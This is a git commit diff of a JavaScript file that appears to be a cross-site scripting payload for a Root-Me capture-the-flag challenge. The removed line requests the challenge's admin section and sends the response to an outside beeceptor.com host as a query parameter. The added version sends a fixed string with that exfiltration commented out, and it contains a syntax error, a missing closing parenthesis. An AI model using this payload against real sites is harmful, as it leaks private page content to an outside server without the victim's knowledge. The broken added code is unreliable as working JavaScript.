3504b7ffda4fe58483fff5cafb890d07f373ffb8
Victor Vague <48601663+SomebodyLikeEveryBody@users.noreply.github.com>
2020-03-25 20:58:42 +0100

    Update js.js

--- js.js
+++ js.js
@@ -1,1 +1,11 @@
-var xhr = new XMLHttpRequest(); xhr.open("GET", "http://challenge01.root-me.org/web-client/ch19/?section=admin", true); xhr.onreadystatechange = function() {var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "https://forumv2.free.beeceptor.com/?cc="+this.responseText, true);  xhr2.send(null);}; xhr.send(null);
+var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://challenge01.root-me.org/web-client/ch19/?section=admin", true);
+
+xhr.onreadystatechange = function() {
+  var xhr2 = new XMLHttpRequest();
+      xhr2.open("GET", "https://forumv2.free.beeceptor.com/?cc=AKAY", true;
+                //+encodeURI(this.responseText), true);
+      xhr2.send(null);
+};
+
+xhr.send(null);
